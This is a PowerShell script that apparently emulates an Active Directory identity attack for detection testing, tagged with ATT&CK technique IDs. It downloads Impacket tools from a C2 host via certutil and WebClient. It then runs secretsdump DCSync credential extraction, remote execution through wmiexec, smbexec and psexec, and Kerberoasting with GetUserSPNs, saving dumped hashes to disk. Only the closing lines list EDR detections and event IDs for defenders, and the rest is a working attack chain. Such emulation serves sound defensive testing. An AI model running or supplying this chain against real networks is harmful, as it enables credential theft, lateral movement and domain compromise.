$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }
$TargetIP = if ($env:TARGET_IP) { $env:TARGET_IP } else { "192.168.1.10" }

Write-Host "[*] Starting Identity Attack - Impacket Suite Remote Execution..." -ForegroundColor Cyan
Write-Host "[!] Target: $TargetIP" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
$impacketDir = "$stagingDir\impacket"
New-Item -ItemType Directory -Path $impacketDir -Force | Out-Null

Write-Host "`n[*] Current context:" -ForegroundColor Yellow
Write-Host "    User: $env:USERDOMAIN\$env:USERNAME"

# Step 1: Download Impacket standalone binaries
Write-Host "`n[*] [T1105] Downloading Impacket tools from C2..." -ForegroundColor Yellow

$tools = @(
    @{ Name="secretsdump"; File="secretsdump.exe"; Desc="DCSync/credential extraction" },
    @{ Name="wmiexec"; File="wmiexec.exe"; Desc="WMI remote exec" },
    @{ Name="smbexec"; File="smbexec.exe"; Desc="SMB remote exec" },
    @{ Name="psexec"; File="psexec_impacket.exe"; Desc="Service-based exec" },
    @{ Name="atexec"; File="atexec.exe"; Desc="Task Scheduler exec" },
    @{ Name="GetUserSPNs"; File="GetUserSPNs.exe"; Desc="Kerberoasting" }
)

foreach ($tool in $tools) {
    $toolPath = "$impacketDir\$($tool.File)"
    Write-Host "    [*] $($tool.Name) ($($tool.Desc))..."
    certutil -urlcache -split -f "http://$C2Host/tools/impacket/$($tool.File)" $toolPath 2>&1 | Out-Null
    if (-not (Test-Path $toolPath)) {
        try { (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/impacket/$($tool.File)", $toolPath) } catch {}
    }
    if (Test-Path $toolPath) { Write-Host "        [+] Staged" -ForegroundColor Green }
    else { Write-Host "        [-] Failed" -ForegroundColor Red }
}

# Step 2: secretsdump - DCSync
$secretsdump = "$impacketDir\secretsdump.exe"
if (Test-Path $secretsdump) {
    Write-Host "`n[*] [T1003.006] secretsdump - DCSync via Impacket..." -ForegroundColor Yellow
    Write-Host "    CMD: secretsdump.exe -just-dc $env:USERDOMAIN/$env:USERNAME@$TargetIP"
    $dumpOutput = "$impacketDir\secretsdump_output.txt"
    & $secretsdump "-just-dc" "$env:USERDOMAIN/$env:USERNAME@$TargetIP" 2>&1 | Tee-Object -FilePath $dumpOutput
    if (Test-Path $dumpOutput) {
        $lc = (Get-Content $dumpOutput | Measure-Object).Count
        Write-Host "    [+] Output saved: $dumpOutput ($lc lines)" -ForegroundColor Green
    }
}

# Step 3: wmiexec - WMI remote execution
$wmiexec = "$impacketDir\wmiexec.exe"
if (Test-Path $wmiexec) {
    Write-Host "`n[*] [T1047] wmiexec - WMI Remote Execution..." -ForegroundColor Yellow
    Write-Host "    CMD: wmiexec.exe $env:USERDOMAIN/$env:USERNAME@$TargetIP `"whoami /all`""
    & $wmiexec "$env:USERDOMAIN/$env:USERNAME@$TargetIP" "whoami /all" 2>&1
}

# Step 4: smbexec - SMB remote execution
$smbexec = "$impacketDir\smbexec.exe"
if (Test-Path $smbexec) {
    Write-Host "`n[*] [T1021.002] smbexec - SMB Remote Execution..." -ForegroundColor Yellow
    Write-Host "    CMD: smbexec.exe $env:USERDOMAIN/$env:USERNAME@$TargetIP"
    & $smbexec "$env:USERDOMAIN/$env:USERNAME@$TargetIP" "hostname" 2>&1
}

# Step 5: psexec (Impacket) - Service execution
$psexec = "$impacketDir\psexec_impacket.exe"
if (Test-Path $psexec) {
    Write-Host "`n[*] [T1569.002] psexec.py - Service Execution..." -ForegroundColor Yellow
    Write-Host "    CMD: psexec_impacket.exe $env:USERDOMAIN/$env:USERNAME@$TargetIP `"whoami`""
    & $psexec "$env:USERDOMAIN/$env:USERNAME@$TargetIP" "whoami" 2>&1
}

# Step 6: GetUserSPNs - Kerberoasting
$getUserSPNs = "$impacketDir\GetUserSPNs.exe"
if (Test-Path $getUserSPNs) {
    Write-Host "`n[*] [T1558.003] GetUserSPNs - Kerberoast via Impacket..." -ForegroundColor Yellow
    $kerbOut = "$impacketDir\kerberoast_impacket.txt"
    Write-Host "    CMD: GetUserSPNs.exe $env:USERDOMAIN/$env:USERNAME -request -outputfile $kerbOut"
    & $getUserSPNs "$env:USERDOMAIN/$env:USERNAME" "-request" "-outputfile" $kerbOut 2>&1
    if (Test-Path $kerbOut) { Write-Host "    [+] Hashes saved: $kerbOut" -ForegroundColor Green }
}

# Summary
Write-Host "`n[*] Impacket Tools Status:" -ForegroundColor Cyan
foreach ($tool in $tools) {
    $tp = "$impacketDir\$($tool.File)"
    if (Test-Path $tp) {
        $sz = [math]::Round((Get-Item $tp).Length / 1KB)
        Write-Host "    [+] $($tool.Name) - STAGED (${sz}KB)" -ForegroundColor Green
    } else { Write-Host "    [-] $($tool.Name) - NOT AVAILABLE" -ForegroundColor Red }
}

Write-Host "`n[+] Impacket Suite Execution Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Unknown executables, SMB lateral movement, WMI process creation, service install" -ForegroundColor Yellow
Write-Host "[!] Key Event IDs: 7045 (Service Install), 4624 Type 3 (Network Logon), 5145 (Share Access)" -ForegroundColor Yellow
